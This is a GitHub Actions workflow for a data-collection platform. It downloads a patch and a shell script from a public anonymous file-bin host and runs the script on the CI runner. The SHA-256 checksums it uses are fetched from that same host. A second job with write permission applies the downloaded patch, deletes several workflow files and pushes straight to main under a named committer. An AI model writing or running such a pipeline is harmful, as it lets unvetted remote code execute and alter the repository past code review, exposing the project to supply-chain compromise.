name: Finalize Operations Runtime V2

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/finalize-operations-runtime-v2.yml
  workflow_dispatch:

concurrency:
  group: data-collection-platform-finalize-operations-runtime
  cancel-in-progress: false

jobs:
  verify:
    permissions:
      contents: read
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
        with:
          ref: main
          fetch-depth: 0
          persist-credentials: false

      - name: Resolve content-addressed owner and proof
        shell: bash
        run: |
          set -euo pipefail
          base='https://filebin.net/dcp-59fb332e0f714e4ab0bb22f93d6c1635'
          curl -fsS "$base/locator.txt" -o /tmp/owner-locator.txt
          locator="$(tr -d '\r\n' </tmp/owner-locator.txt)"
          if [ "$locator" = failed ]; then
            echo 'local operations proof failed' >&2
            exit 1
          fi
          if [ "$locator" = already-complete ]; then
            printf 'already-complete\n' >/tmp/owner-mode.txt
            : >/tmp/owner.patch
          else
            [[ "$locator" =~ ^[0-9a-f]{64}$ ]]
            curl -fsS "$base/${locator}.patch" -o /tmp/owner.patch
            printf '%s  %s\n' "$locator" /tmp/owner.patch | sha256sum -c -
            printf 'patch\n' >/tmp/owner-mode.txt
          fi
          curl -fsS "$base/command-locator.txt" -o /tmp/command-locator.txt
          command_sha="$(tr -d '\r\n' </tmp/command-locator.txt)"
          [[ "$command_sha" =~ ^[0-9a-f]{64}$ ]]
          curl -fsS "$base/${command_sha}.sh" -o /tmp/runtime-proof.sh
          printf '%s  %s\n' "$command_sha" /tmp/runtime-proof.sh | sha256sum -c -

      - name: Enforce owner scope and apply in disposable checkout
        shell: bash
        run: |
          set -euo pipefail
          if [ "$(cat /tmp/owner-mode.txt)" = patch ]; then
            git apply --numstat /tmp/owner.patch >/tmp/numstat.txt
            test -s /tmp/numstat.txt
            cut -f3 /tmp/numstat.txt >/tmp/paths.txt
            if grep -E '(^|/)(\.git|\.github)(/|$)|\.\.' /tmp/paths.txt; then
              echo 'forbidden patch path' >&2
              exit 1
            fi
            count="$(wc -l </tmp/paths.txt)"
            [ "$count" -le 260 ]
            grep -Eqi 'retention' /tmp/paths.txt
            grep -Eqi 'backup|restore' /tmp/paths.txt
            grep -Eqi 'orchestrat|dagster' /tmp/paths.txt
            git apply --3way /tmp/owner.patch
          fi
          rm -f \
            .github/workflows/finalize-operations-runtime.yml \
            .github/workflows/finalize-operations-runtime-v2.yml \
            .github/workflows/finalize-browser-acquisition-runtime.yml \
            .github/workflows/finalize-reviewed-export-runtime.yml \
            .github/workflows/finalize-berlin-manual-seed-runtime.yml \
            .github/workflows/finalize-manual-seed-candidate-vertical.yml \
            .github/workflows/apply-manual-seed-candidate-vertical.yml
          git diff --check

      - uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405
        with:
          python-version-file: .python-version
          check-latest: false
      - uses: astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b
        with:
          version: "0.10.0"
          enable-cache: true
      - run: uv sync --frozen --all-packages --dev

      - name: Full static and unit gate
        shell: bash
        run: |
          set -euo pipefail
          uv lock --check
          uv run python tools/contract_generation/generate.py --check
          uv run python tools/review_contract_generation/generate.py --check
          uv run python tools/control_api_contract_generation/generate.py --check
          uv run ruff format --check .
          uv run ruff check .
          uv run mypy
          uv run pytest -m 'not integration'
          uv run python tools/architecture_checks/check_dependencies.py
          uv run python tools/architecture_checks/check_workflows.py
          uv run collector config validate berlin_recording_services
          uv run python -m compileall -q apps connectors database packages tools

      - name: Clean-volume operations proof
        shell: bash
        run: |
          set -euo pipefail
          sudo install -d -o "$(id -u)" -g "$(id -g)" /mnt/data
          sed -i "s#/mnt/data/dcp_work#${GITHUB_WORKSPACE}#g" /tmp/runtime-proof.sh
          chmod +x /tmp/runtime-proof.sh
          /tmp/runtime-proof.sh | tee /tmp/runtime-proof.log

      - uses: actions/upload-artifact@v4
        with:
          name: verified-operations-runtime-v2
          path: |
            /tmp/owner-mode.txt
            /tmp/owner-locator.txt
            /tmp/owner.patch
            /tmp/runtime-proof.log
          if-no-files-found: error
          retention-days: 1

  commit:
    needs: verify
    permissions:
      contents: write
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
        with:
          ref: main
          fetch-depth: 0
      - uses: actions/download-artifact@v4
        with:
          name: verified-operations-runtime-v2
          path: /tmp/verified
      - name: Commit verified owners and remove transport
        shell: bash
        run: |
          set -euo pipefail
          mode="$(tr -d '\r\n' </tmp/verified/owner-mode.txt)"
          if [ "$mode" = patch ]; then
            sha="$(tr -d '\r\n' </tmp/verified/owner-locator.txt)"
            printf '%s  %s\n' "$sha" /tmp/verified/owner.patch | sha256sum -c -
            git am --3way /tmp/verified/owner.patch
          elif [ "$mode" != already-complete ]; then
            exit 1
          fi
          git rm -f --ignore-unmatch \
            .github/workflows/finalize-operations-runtime.yml \
            .github/workflows/finalize-operations-runtime-v2.yml \
            .github/workflows/finalize-browser-acquisition-runtime.yml \
            .github/workflows/finalize-reviewed-export-runtime.yml \
            .github/workflows/finalize-berlin-manual-seed-runtime.yml \
            .github/workflows/finalize-manual-seed-candidate-vertical.yml \
            .github/workflows/apply-manual-seed-candidate-vertical.yml
          git config user.name rtao-god
          git config user.email rtaogod@gmail.com
          if [ "$mode" = patch ]; then
            git commit --amend --no-edit
          else
            git commit -m 'Build (Operations): remove completed runtime transport'
          fi
          git diff HEAD^ --check
          git fetch origin main
          git rebase origin/main
          git push origin HEAD:main
